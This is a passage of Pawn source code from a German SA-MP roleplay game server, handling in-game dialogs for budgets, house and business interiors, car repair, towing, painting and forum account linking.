	    if(budget == 0) return SCM(playerid,-1,"Ein Fehler ist aufgetreten!");
	    switch(budget)
	    {
	        case 1:
	        {
	            Staat[LSPDBudget] = strval(inputtext);
	            format(string, sizeof(string), "[Info] Du hast das Budget für das LSPD auf %d$ / Tag gesetzt.", Staat[LSPDBudget]);
	            SCM(playerid,-1,string);

			}
			case 2:
	        {
	            Staat[FBIBudget] = strval(inputtext);
	            format(string, sizeof(string), "[Info] Du hast das Budget für das FBI auf %d$ / Tag gesetzt.", Staat[FBIBudget]);
	            SCM(playerid,-1,string);

			}
			case 3:
	        {
	            Staat[ArmyBudget] = strval(inputtext);
	            format(string, sizeof(string), "[Info] Du hast das Budget für die Bundeswehr auf %d$ / Tag gesetzt.", Staat[ArmyBudget]);
	            SCM(playerid,-1,string);

			}
		}
	}

	/*
	enum StaatsInfo
{
	LSPDBudget,
	FBIBudget,
	ArmyBudget,
	Stadtreinigung,
	OAMTBudget,
	Rundfunk
}
new Staat[StaatsInfo];

*/

	if(dialogid == DIALOG_TUTORIAL_JANEIN)  //+ xxx
	{
	    if(!response) { PlayerInfo[playerid][pLevel] = 2; GivePlayerMoneySave(playerid,50000); SCM(playerid,COLOR_LIGHTBLUE,"* Wir wünschen dir viel Spaß beim Spielen!");  return 0;}
	    TutStep[playerid] = 1;
	    SCM(playerid,COLOR_LIGHTBLUE,"Alles klar! Mit /carkey kannst du dein Fahrzeug auswählen und mit /findcar orten.");
	    SCM(playerid,COLOR_LIGHTBLUE,"Steig bitte in dein Fahrzeug ein und folge dem Checkpoint zur Stadthalle.");
	    SCM(playerid,COLOR_GRAD1,"*Falls dein Checkpoint aus irgendeinem Grund nicht da ist, kannst du ihn per /resetcp erneut setzen.");
	    SetPlayerCheckpoint(playerid,1481.0176,-1769.5886,18.7958,8.0);  // Stadthalle Fenter

	}

	if(dialogid == DIALOG_HINT_AENDERN)
	{



	    if(!response) return 0;
        new i = GetPVarInt(playerid,"Hint");
   		new Float:HX, Float:HY, Float:HZ, hInterior;

	    /// ShowPlayerDialog(playerid,DIALOG_HINT_AENDERN,DIALOG_STYLE_LIST,"Houseinerior ändern","Standart(10.000$)\nHolzhütte(15.000$)\nMittel Luxus(45.000$)\nLuxus Villa(350.000$)\nHolzhütte Edel(360.000$)\nJefferson Motel(1.000.000$)","Kaufen","Abbrechen");
	    switch(listitem)
	    {

		    case 0:
		    {
		        //if(floatcmp(244.5000, HouseInfo[i][hExitx]) return SCM(playerid,-1,"Dieses Interior ist bereits in benutzung.");

		        if(GetPlayerMoneySave(playerid)<=10000) return SCM(playerid,-1,"Du kannst dir dieses Interior nicht leisten.");
		        HX = 244.5000; HY = 305.0000; HZ = 999.1484; hInterior = 1;
		        GivePlayerMoneySave(playerid,-10000);
		        SCM(playerid,-1,"Herzlichen Glückwunsch! Dein neues Interior wurde auf Standart gesetzt!");
		    }
		    case 1:
		    {
		        if(GetPlayerMoneySave(playerid)<=15000) return SCM(playerid,-1,"Du kannst dir dieses Interior nicht leisten.");
		        //if(floatcmp(301.3000, HouseInfo[i][hExitx]) return SCM(playerid,-1,"Dieses Interior ist bereits in benutzung.");
		        HX = 301.3000; HY = 306.0000; HZ = 1003.5391; hInterior = 4;
		        GivePlayerMoneySave(playerid,-15000);
		        SCM(playerid,-1,"Herzlichen Glückwunsch! Dein neues Interior wurde auf Holzhütte gesetzt!");
		    }
		    case 2:
		    {
		        if(GetPlayerMoneySave(playerid)<=45000) return SCM(playerid,-1,"Du kannst dir dieses Interior nicht leisten.");
		       // if(floatcmp(-42.5674, HouseInfo[i][hExitx]) return SCM(playerid,-1,"Dieses Interior ist bereits in benutzung.");
		 //       HX = -42.5674; HY = 1406.0640; HZ = 1084.4297; hInterior = 8;
		        GivePlayerMoneySave(playerid,-45000);
		        SCM(playerid,-1,"Herzlichen Glückwunsch! Dein neues Interior wurde auf Mittel Luxus gesetzt!");
		    }
		    case 3:
		    {
		        if(GetPlayerMoneySave(playerid)<=350000) return SCM(playerid,-1,"Du kannst dir dieses Interior nicht leisten.");
		       // if(floatcmp(23.9657, HouseInfo[i][hExitx]) return SCM(playerid,-1,"Dieses Interior ist bereits in benutzung.");
		        HX = 23.9657; HY = 1340.6852; HZ = 1084.3750; hInterior = 10;
		        GivePlayerMoneySave(playerid,-350000);
		        SCM(playerid,-1,"Herzlichen Glückwunsch! Dein neues Interior wurde auf Luxus Villa gesetzt!");
		    }
		    case 4:
		    {
		        if(GetPlayerMoneySave(playerid)<=360000) return SCM(playerid,-1,"Du kannst dir dieses Interior nicht leisten.");
		       // if(floatcmp(223.0092, HouseInfo[i][hExitx]) return SCM(playerid,-1,"Dieses Interior ist bereits in benutzung.");
		        HX = 223.0092; HY = 1287.6935; HZ = 1082.1406; hInterior = 1;
		        GivePlayerMoneySave(playerid,-360000);
		        SCM(playerid,-1,"Herzlichen Glückwunsch! Dein neues Interior wurde auf Holzhütte Edel gesetzt!");

		    }
		    case 5:
		    {
		        if(GetPlayerMoneySave(playerid)<=1000000) return SCM(playerid,-1,"Du kannst dir dieses Interior nicht leisten.");
		       // if(floatcmp(2214.6282, HouseInfo[i][hExitx]) return SCM(playerid,-1,"Dieses Interior ist bereits in benutzung.");
		        HX = 2214.6282; HY = -1150.4385; HZ = 1025.7969; hInterior = 15;
		        SCM(playerid,-1,"Herzlichen Glückwunsch! Dein neues Interior wurde auf Jefferson Motel gesetzt!");

		        GivePlayerMoneySave(playerid,-1000000);

		    }

	     	//SaveProperty(i);
		}
		new string[128];

		format(string, sizeof(string), "* du hast %d.", i);
 		SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
		HouseInfo[i][hExitx] = HX; HouseInfo[i][hExity] = HY; HouseInfo[i][hExitz] = HZ; HouseInfo[i][hInt] = hInterior;
		SaveProperty(i);
	}
	if(dialogid == DIALOG_FIXCAROFFER)
	{

	//	SetPVarInt(pid,"RepVonID",playerid);
 	//	SetPVarInt(pid,"RepPreis",preis);
 		new pid = GetPVarInt(playerid,"RepVonID");
 		new preis = GetPVarInt(playerid,"RepPreis");
 		new vehid = GetPVarInt(playerid,"VehicleID"); // nicht zwingend nötig aber gut für anti dialog ka falls der spieler fahrzeug wechselt (GetPlayerVehicleID(pid)) >>


		if(preis > GetPlayerMoneySave(playerid)) return SCM(playerid,-1,"Du kannst dir die Reparatur nicht leisten.");
		if(vehid != INVALID_VEHICLE_ID)
		{
		    new string[128];

		 	format(string, sizeof(string), "* Du hast %s's Fahrzeug für %d$ zu repariert.", GetName(pid),preis);
	    	SendClientMessage(pid, COLOR_LIGHTBLUE, string);


			format(string, sizeof(string), "* Dein Fahrzeug wurde von Mechaniker %s für %d$ repariert.?", GetName(playerid),preis);
	  		SCM(playerid,COLOR_LIGHTBLUE,string);

	  		RepairVehicle(vehid);

		}

	}

    if(dialogid == BDIALOG_ID)
    {
        if(!response)
            return 0;

        if(BFloorRequestedBy[listitem] != INVALID_PLAYER_ID || BIsFloorInQueue(listitem))
            GameTextForPlayer(playerid, "~r~The floor is already in the queue", 3500, 4);
		else if(BDidPlayerRequestElevator(playerid))
		    GameTextForPlayer(playerid, "~r~You already requested the elevator", 3500, 4);
		else
	        BCallElevator(playerid, listitem);

		return 1;
    }
    if(dialogid == ADIALOG_ID)
    {
        if(!response)
            return 0;

        if(AFloorRequestedBy[listitem] != INVALID_PLAYER_ID || AIsFloorInQueue(listitem))
            GameTextForPlayer(playerid, "~r~The floor is already in the queue", 3500, 4);
		else if(ADidPlayerRequestElevator(playerid))
		    GameTextForPlayer(playerid, "~r~You already requested the elevator", 3500, 4);
		else
	        ACallElevator(playerid, listitem);

		return 1;
    }




	    if(dialogid == DIALOG_FRAKID)
	    {
		    if(response == 1)
		    {
					FrakInfo[PlayerInfo[playerid][pTemp]][fFrak] = strval(inputtext);
					OnPropUpdate_f(PlayerInfo[playerid][pTemp]);
			        SendClientMessage(playerid,COLOR_LIGHTBLUE,"* Setze nun per /frakend den Marker für den Ausgang!");
			}
			else
		    {
					ShowPlayerDialog(playerid,DIALOG_FRAKID, DIALOG_STYLE_INPUT, "Fraktion", "Welche Fraktion ID soll diese Base gehören ?:", "Akzeptieren", "Abbrechen");
			}
			return 1;
		}




//					FrakInfo[x_job][fExitX] = 286.148986;
//					FrakInfo[x_job][fExitY] = -40.644397;
//					FrakInfo[x_job][fExitZ] = 1001.515625;




	    if(dialogid == 2345)// IF RESPONSE 				pickup = 1;
	    {

		    if(response == 1)
		    {

				new i = DialogTempAmk[playerid][listitem];

	            SpawnChange[playerid] = 1;
			   	SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du Spawnst nun bei deinem Haus // Mietwohnung.");
				PlayerInfo[playerid][pHouseKey] = i;

			}
			return 1;
		}







	    if(dialogid == DIALOG_BIZ_ERSTELLEN)// IF RESPONSE 				pickup = 1;
	    {

		    if(response == 1)
		    {

			    switch(listitem)
			    {
			        case 0:
			        {
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bInterior] = 1;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitX] = 286.148986;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitY] = -40.644397;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitZ] = 1001.515625;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitR] = 0;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bTyp] = 1;
					OnPropUpdate_b(PlayerInfo[playerid][pCreateBiz]);
					}
			        case 1:
			        {
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bInterior] = 4;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitX] = 286.800994;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitY] = -82.547599;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitZ] = 1001.515625;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitR] = 0;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bTyp] = 1;
					OnPropUpdate_b(PlayerInfo[playerid][pCreateBiz]);
					}
			        case 2:
			        {
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bInterior] = 6;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitX] = 296.919982;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitY] = -108.071998;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitZ] = 1001.515625;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitR] = 0;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bTyp] = 1;
					OnPropUpdate_b(PlayerInfo[playerid][pCreateBiz]);
					}
			        case 3:
			        {
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bInterior] = 7;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitX] = 314.820983;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitY] = -141.431991;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitZ] = 999.601562;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitR] = 0;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bTyp] = 1;
					OnPropUpdate_b(PlayerInfo[playerid][pCreateBiz]);
					}
			        case 4:
			        {
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bInterior] = 6;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitX] = 316.524993;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitY] = -167.706985;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitZ] = 999.593750;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitR] = 0;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bTyp] = 1;
					OnPropUpdate_b(PlayerInfo[playerid][pCreateBiz]);
					}
			        case 5:// Clucking Bell
			        {
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bInterior] = 9;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitX] = 365.1706;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitY] = -11.1658;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitZ] = 1001.8516;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitR] = 0;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bTyp] = 2;
					OnPropUpdate_b(PlayerInfo[playerid][pCreateBiz]);
					}
			        case 6:// BSN
			        {
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bInterior] = 10;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitX] = 362.9936;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitY] = -75.0536;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitZ] = 1001.5078;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitR] = 0;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bTyp] = 3;
					OnPropUpdate_b(PlayerInfo[playerid][pCreateBiz]);
					}
			        case 7:// 24/7
			        {
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bInterior] = 10;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitX] = 6.091179;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitY] = -29.271898;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitZ] = 1003.549438;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitR] = 0;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bTyp] = 4;
					OnPropUpdate_b(PlayerInfo[playerid][pCreateBiz]);
					}
			        case 8:// Stacj Pizza
			        {
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bInterior] = 5;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitX] = 372.3706;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitY] = -133.1797;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitZ] = 1001.4922;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitR] = 0;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bTyp] = 5;
					OnPropUpdate_b(PlayerInfo[playerid][pCreateBiz]);
					}
			        case 9://Lil' probe inn
			        {
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bInterior] = 18;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitX] = -229.0070;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitY] = 1401.4771;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitZ] = 27.7656;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitR] = 0;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bTyp] = 6;
					OnPropUpdate_b(PlayerInfo[playerid][pCreateBiz]);
					}
			        case 10://Bar
			        {
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bInterior] = 11;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitX] = 501.8982;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitY] = -68.0153;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitZ] = 998.7578;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitR] = 0;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bTyp] = 7;
					OnPropUpdate_b(PlayerInfo[playerid][pCreateBiz]);
					}
			        case 11://Club
			        {
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bInterior] = 17;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitX] = 493.3811;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitY] = -24.0744;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitZ] = 1000.6797;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitR] = 0;
					BizzInfo[PlayerInfo[playerid][pCreateBiz]][bTyp] = 8;
					OnPropUpdate_b(PlayerInfo[playerid][pCreateBiz]);
					}
			        case 12://sBizz
			        {
					    if(IsPlayerAdmin(playerid))
					    {
							BizzInfo[PlayerInfo[playerid][pCreateBiz]][bInterior] = 18;
							BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitX] = -229.0070;
							BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitY] = 1401.4771;
							BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitZ] = 27.7656;
							BizzInfo[PlayerInfo[playerid][pCreateBiz]][bExitR] = 0;
							BizzInfo[PlayerInfo[playerid][pCreateBiz]][bTyp] = 9;
							OnPropUpdate_b(PlayerInfo[playerid][pCreateBiz]);

						}
						else
					    {

							SendClientMessage(playerid,COLOR_GREY,"Du musst dafür im RCON angemeldet sein.");

						}
					}
				}
			}
		return 1;
	}

	    if(dialogid == DIALOG_STATUR_PRICE)// IF RESPONSE 				pickup = 1;
	    {

		    if(response == 1)
		    {
				pickup = listitem+1;


				new Float:x, Float:y, Float:z;
				GetPlayerPos(playerid, x, y, z);
			 	new LocationZone[MAX_ZONE_NAME];
			 	Get2DZone(x,y, LocationZone, MAX_ZONE_NAME);


				pickupX = CreatePickup(1276, 1, x, y+2, z, -1);


				switch(listitem)
				{

				    case 0:
				    {
			        new textstringd[256];
			            format(textstringd,sizeof(textstringd),"Admin %s hat in %s eine Statur versteckt! Gewinn: Unterbodenbeleuchtung Gutschein",GetName(playerid),LocationZone);
			            SendClientMessageToAll(COLOR_LIGHTBLUE,textstringd);// /duty Sound von RPG Busfhrer
			   		format(textstringd,sizeof(textstringd),"www.gta-reallife.de - Statur versteckt! %s",LocationZone);
			        TextDrawSetString(Copyright,textstringd);

					}
				    case 1:
				    {
			        new textstringd[256];
			            format(textstringd,sizeof(textstringd),"Admin %s hat in %s eine Statur versteckt! Gewinn: 10 Respektpunkte Gutschein",GetName(playerid),LocationZone);
			            SendClientMessageToAll(COLOR_LIGHTBLUE,textstringd);// /duty Sound von RPG Busfhrer
			   		format(textstringd,sizeof(textstringd),"www.gta-reallife.de - Statur versteckt! %s",LocationZone);
			        TextDrawSetString(Copyright,textstringd);

					}
				    case 2:
				    {
			        new textstringd[256];
			            format(textstringd,sizeof(textstringd),"Admin %s hat in %s eine Statur versteckt! Gewinn: Premium Permanent Gutschein",GetName(playerid),LocationZone);
			            SendClientMessageToAll(COLOR_LIGHTBLUE,textstringd);// /duty Sound von RPG Busfhrer

			   		format(textstringd,sizeof(textstringd),"www.gta-reallife.de - Statur versteckt! %s",LocationZone);
			        TextDrawSetString(Copyright,textstringd);
					}
				    case 3:
				    {
			        new textstringd[256];
			            format(textstringd,sizeof(textstringd),"Admin %s hat in %s eine Statur versteckt! Gewinn: Wunschkennzeichen Gutschein",GetName(playerid),LocationZone);
			            SendClientMessageToAll(COLOR_LIGHTBLUE,textstringd);// /duty Sound von RPG Busfhrer
			   		format(textstringd,sizeof(textstringd),"www.gta-reallife.de - Statur versteckt! %s",LocationZone);
			        TextDrawSetString(Copyright,textstringd);

					}
				    case 4:
				    {
			        new textstringd[256];
			            format(textstringd,sizeof(textstringd),"Admin %s hat in %s eine Statur versteckt! Gewinn: Wunschfahrzeug Gutschein",GetName(playerid),LocationZone);
			            SendClientMessageToAll(COLOR_LIGHTBLUE,textstringd);// /duty Sound von RPG Busfhrer
			   		format(textstringd,sizeof(textstringd),"www.gta-reallife.de - Statur versteckt! %s",LocationZone);
			        TextDrawSetString(Copyright,textstringd);

					}
				    case 5:
				    {
			        new textstringd[256];
			            format(textstringd,sizeof(textstringd),"Admin %s hat in %s eine Statur versteckt! Gewinn: Sonderlack Gutschein",GetName(playerid),LocationZone);
			            SendClientMessageToAll(COLOR_LIGHTBLUE,textstringd);// /duty Sound von RPG Busfhrer
			   		format(textstringd,sizeof(textstringd),"www.gta-reallife.de - Statur versteckt! %s",LocationZone);
			        TextDrawSetString(Copyright,textstringd);

					}
			       // new textstringf[256];
			   	//	format(string,sizeof(string),"www.gta-reallife.de - Statur versteckt! %s",LocationZone);
			       // TextDrawSetString(Copyright,string);
				}
	    }
}




/*

C:\Dokumente und Einstellungen\Sven\Desktop\SaveMoney\Feuerwehr2.pwn(48439) : error 002: only a single statement (or expression) can follow each "case"
C:\Dokumente und Einstellungen\Sven\Desktop\SaveMoney\Feuerwehr2.pwn(48439) : error 017: undefined symbol "textstringd"
C:\Dokumente und Einstellungen\Sven\Desktop\SaveMoney\Feuerwehr2.pwn(48439) : warning 215: expression has no effect
C:\Dokumente und Einstellungen\Sven\Desktop\SaveMoney\Feuerwehr2.pwn(48439) : error 001: expected token: ";", but found "]"
C:\Dokumente und Einstellungen\Sven\Desktop\SaveMoney\Feuerwehr2.pwn(48439) : fatal error 107: too many error messages on one line

Compilation aborted.Pawn compiler 3.2.3664	 	 	Copyright (c) 1997-2006, ITB CompuPhase


4 Errors.




*/





	if(dialogid == 6313)
	{


//			new query[128];// DIA ID 6313
		    if(response == 1)
		    {
			    if(!strlen(inputtext))return ShowPlayerDialog(playerid,6313, DIALOG_STYLE_INPUT, "E-Mail", "Du hast nun die Möglichkeit deine Email mit deinem Forumaccount zu verknüpfen\n\nDies ist keine Pflicht, um ohne verknüpften Forumaccount fortzufahren drücke die ESC Taste.\n\nHinweis: Eine nachträgliche verknüpfung ist nicht möglich!", "Verknüpfen", "Abbrechen");
			    if(strfind(inputtext,"@") == -1)
				{
				    ShowPlayerDialog(playerid,6313, DIALOG_STYLE_INPUT, "E-Mail", "Du hast nun die Möglichkeit deine Email mit deinem Forumaccount zu verknüpfen\n\nDies ist keine Pflicht, um ohne verknüpften Forumaccount fortzufahren drücke die ESC Taste.\n\nHinweis: Eine nachträgliche verknüpfung ist nicht möglich!", "Verknüpfen", "Abbrechen");
				    return SendClientMessage(playerid,COLOR_GREY,"Die E-Mail wurde nicht erkannt!");
			    }
	            new queryx[265];
	            format(queryx, sizeof(queryx),"%s",inputtext);
				WBB_AddUser(GetName(playerid), PlayerInfo[playerid][pTempPassword], queryx, playerid, 1);
				ShowPlayerDialog(playerid, 1836, DIALOG_STYLE_MSGBOX, "Geschlecht", "Bist du Männlich oder Weiblich ?", "Männlich", "Weiblich");
				PlayerInfo[playerid][pWBBid] = WBB_GetUserIDFixed(playerid);

		    }
   			else
			{
	            new queryx[265];
				new rand = random(5000000000);
	            format(queryx, sizeof(queryx),"%d@mysteryreallife.eu", rand);
				WBB_AddUser(GetName(playerid), inputtext, queryx, playerid, 1);
				ShowPlayerDialog(playerid, 1836, DIALOG_STYLE_MSGBOX, "Geschlecht", "Bist du Männlich oder Weiblich ?", "Männlich", "Weiblich");
				PlayerInfo[playerid][pWBBid] = WBB_GetUserIDFixed(playerid);

			}


		return 1;
	}


	if(dialogid == DIALOG_AUSWAHL33)
	{
	    if(response==1)
		{
		    switch(listitem)
		    {
		        case 0:
		        {
		         	if(GetPlayerMoneySave(playerid) >= 15000)
		         	{
						if(!Dtc_PlayerHaveCar[playerid][Dtc_PlayerKey[playerid]])
						{
						SendClientMessage(playerid, COLOR_GREY, "Du besitzt kein Fahrzeug auf diesem Schlüssel!!");
						return 1;
						}
						if(PlayerCar[playerid][Dtc_PlayerKey[playerid]][Abgeschleppt] == 0)
						{
						SendClientMessage(playerid, COLOR_GREY, "Das Fahrzeug ist nicht abgeschleppt!");
						return 1;
						}
						GivePlayerMoneySave(playerid, -15000);
						FraktionsKasse[23] += 15000;
						SetVehiclePos(PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarId], 935.9608,-1207.8639,16.9211);
						SetVehicleZAngle(PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarId], 0.0011);
						PlayerCar[playerid][Dtc_PlayerKey[playerid]][Abgeschleppt] = 0;
			    		PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarPos_x] = 935.9608;
						PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarPos_y] = -1207.8639;
						PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarPos_z] = 16.9211;
						PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarRotate] = 0.0011;
						SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du hast dein Fahrzeug freigekauft, Es wurde gespawnt!");
					}
					else
					{
					SendClientMessage(playerid, COLOR_GRAD1, "Du hast nicht genug Geld!");
					}
				}
		        case 1:
		        {
					new string[5012];
					DialogTempIndexCarlistx[playerid] = 0;
				    for(new i; i < MAX_FACTION_CARS; i++)
					{
					    if(FactionCars[i][fVehid] >= 400 && FactionCars[i][fVehid] <= 611)
						{
							if(FactionCars[i][fFaction] == PlayerInfo[playerid][sMember])
							{
								if(FactionCars[i][fTuning][17] == 1)
								{
					       		    format(string, sizeof(string), "%s{FF0000}(Abgeschleppt!){FFFFFF}Fahrzeug: %s | CarID: %d | Kilometer: %d | Tank: %dl\n", string,CarName[FactionCars[i][fVehid]-400], FactionCars[i][fCarid],FactionCars[i][fTuning][15],FactionCars[i][fTuning][16]);
									DialogTempCarlistx[playerid][DialogTempIndexCarlistx[playerid]++] = FactionCars[i][fVehid];
					    		}
					    	}
						}
					}
					if(DialogTempIndexCarlistx[playerid] == 0)
					{
						SendClientMessage(playerid, COLOR_GREY, "Deine Fraktion hat keine Fahrzeuge die Beschlagnahmt sind!");
						return 1;
					}
					ShowPlayerDialog(playerid,DIALOG_ABGESCHLEPPTXD,DIALOG_STYLE_LIST,"Fraktionsfahrzeuge",string,"Auswählen","Abbrechen");
				}
			}
		}
		else
		{
			PlayerInfo[playerid][pAutoFarbe] = 0;
			SendClientMessage(playerid,COLOR_GREY,"Abgebrochen!");
		}
		return 1;
	}
    if(dialogid == DIALOG_ABGESCHLEPPTXD)
    {
		new i = DialogTempCarlistx[playerid][listitem];
		GivePlayerMoneySave(playerid, -15000);
		FraktionsKasse[23] += 15000;
		SetVehiclePos(i, 935.9608,-1207.8639,16.9211);
		SetVehicleZAngle(i, 0.0011);

		FactionCars[i][fPos][0] = 935.9608;
		FactionCars[i][fPos][1] = -1207.8639;
		FactionCars[i][fPos][2] = 16.9211;
		FactionCars[i][fPos][3] = 0.0011;
		FactionCars[i][fTuning][17] = 0;

		SendClientMessage(playerid, COLOR_LIGHTBLUE, "Du hast das Fraktionsfahrzeug freigekauft, Es wurde gespawnt!");

		return 1;
	}
	if(dialogid == DIALOG_LACKIEREN)
	{
	    if(response==1)
		{
			if(PlayerInfo[playerid][pAutoFarbe] != 0)
			{
					new vid = GetPlayerVehicleID(playerid);
	 				if(IsADtCar(vid))// Privatfahrzeug
	   				{

						new carowner = GetDtCarOwner(vid);
		        		new slot = GetDtCarOwnerSlot(carowner,vid);

						SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Auto gefärbt, Kosten: 5000$");
						ChangeVehicleColor(vid, PlayerInfo[playerid][pAutoFarbe], listitem);
						GivePlayerMoneySave(playerid, -5000);
						FraktionsKasse[6] += 5000;
						PlayerCar[carowner][slot][CarC1] = PlayerInfo[playerid][pAutoFarbe];
						PlayerCar[carowner][slot][CarC2] = listitem;
						PlayerInfo[playerid][pAutoFarbe] = 0;
					}
					else
	   				{
				        for(new fc;fc<sizeof(FactionCars);fc++)// Fraktionsfahrzeug
						{
						        if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611)
								{
						            if(vid == FactionCars[fc][fCarid])
									{
								        if(PlayerInfo[playerid][sMember] == FactionCars[fc][fFaction])
										{
									        if(vid != INVALID_VEHICLE_ID)
									        {
												ChangeVehicleColor(vid, PlayerInfo[playerid][pAutoFarbe], listitem);
												SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Auto gefärbt, Kosten: 5000$");
												FactionCars[fc][fCol][0] = PlayerInfo[playerid][pAutoFarbe];
												FactionCars[fc][fCol][1] = listitem;
											}
										}
										else
										{
										SCM(playerid, COLOR_GREY, "Du hast keine Erlaubnis das Fahrzeug zu Lackieren!");
										return 1;
										}
									}
								}
						}
					}
					return 1;
				}
				new vid = GetPlayerVehicleID(playerid);

				new carowner = GetDtCarOwner(vid);
//	            new slot = GetDtCarOwnerSlot(carowner,vid);
				if (carowner == playerid)
				{
					PlayerInfo[playerid][pAutoFarbe] = listitem;
					new lackstring[4024];
					for(new i = 0; i < 120; i++)
					{
	            	 format(lackstring, sizeof(lackstring), "%s%s#######\n",lackstring,VehicleColoursTableRGBANormal[i]);//CarName[i]
					}
	      		    ShowPlayerDialog(playerid, DIALOG_LACKIEREN, DIALOG_STYLE_LIST, "Lackierung Farbe 2", lackstring, "Lackieren", "Abbrechen"); // Ausgabe

				}
				else
				{
					PlayerInfo[playerid][pAutoFarbe] = 0;
					SendClientMessage(playerid,COLOR_GREY,"Dir gehört die Karre nicht!");
				}
		}
		else
		{
			PlayerInfo[playerid][pAutoFarbe] = 0;
			SendClientMessage(playerid,COLOR_GREY,"Abgebrochen!");
		}
	}
	if(dialogid == DIALOG_SONDERLACK)
	{
	    if(response==1)
		{
						new stringfz22[128];
						format(stringfz22, sizeof(stringfz22), "/gutscheine/%s.ini",PlayerInfo[playerid][pAdministrativGutschein]);

						if(dini_Exists(stringfz22))
						{
				       		new vehiclefid = GetPlayerVehicleID(playerid);
							if(IsADtCar(vehiclefid))// Privatfahrzeug
			   				{
								new carowner = GetDtCarOwner(vehiclefid);
				          		new slot = GetDtCarOwnerSlot(carowner,vehiclefid);
								if(carowner != playerid)// Privatfahrzeug
				   				{
						   		SendClientMessage(playerid,COLOR_GREEN,"Das Fahrzeug gehört dir nicht!");
								return 1;
								}
								ChangeVehicleColor(vehiclefid, listitem+128, listitem+128);
				  				PlayerCar[carowner][slot][CarC1] = listitem+128;
							    PlayerCar[carowner][slot][CarC2] = listitem+128;
							}


							dini_Remove(stringfz22);

							SendClientMessage(playerid,COLOR_LIGHTBLUE,"* Du hast dein Fahrzeug erfolgreich umlackiert!");
						}
						else
						{
